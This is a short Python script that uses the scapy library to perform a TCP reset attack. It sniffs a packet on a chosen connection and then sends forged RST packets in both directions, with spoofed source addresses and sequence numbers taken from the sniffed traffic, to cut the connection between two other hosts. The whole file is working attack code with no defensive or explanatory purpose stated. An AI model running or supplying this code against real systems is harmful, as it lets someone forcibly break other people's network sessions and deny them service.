from scapy.all import *
import signal

src = ''
dst = ''
sport = ''
dport = ''
rst_num = [0]

def signal_handler(signal, frame):
    os._exit(0)


def recv_packet(pktdata):

    if pktdata['IP'].proto == 6 and pktdata['TCP']:
        seqno = pktdata['TCP'].ack
        ackno = pktdata['TCP'].seq
        send(IP(src=dst, dst=src) / TCP(sport=int(dport), dport=int(sport), flags="R", seq=ackno, ack=seqno), verbose=0)

        send(IP(src=src, dst=dst) / TCP(sport=int(sport), dport=int(dport), flags="R", seq=seqno), verbose=0)
        global rst_num
        rst_num[0]= rst_num[0]+1

    return

def sniff_recv():
    flt = "dst host " + str(src) + " and dst port " + str(sport) + " and src host " + str(dst) + " and src port " + str(dport)

    print(flt)
    sniff(prn = recv_packet,store = 0,filter=flt,count=1)
    return


def send_rst(data):

    global src
    src = data[1]
    global dst
    dst = data[2]
    global sport
    sport = data[3]
    global dport
    dport = data[4]
    #signal.signal(signal.SIGINT,signal_handler)
    t1 = threading.Thread(target=sniff_recv)
    # signal.signal(signal.SIGINT,signal_handler)
    t1.start()
    time.sleep(1)

    send(IP(src=src, dst=dst) / TCP(sport=int(sport), dport=int(dport), flags="A"), verbose=0)
    return
def theard_send_rst(data):
   t = threading.Thread(target=send_rst,args=(data,))
   t.start()
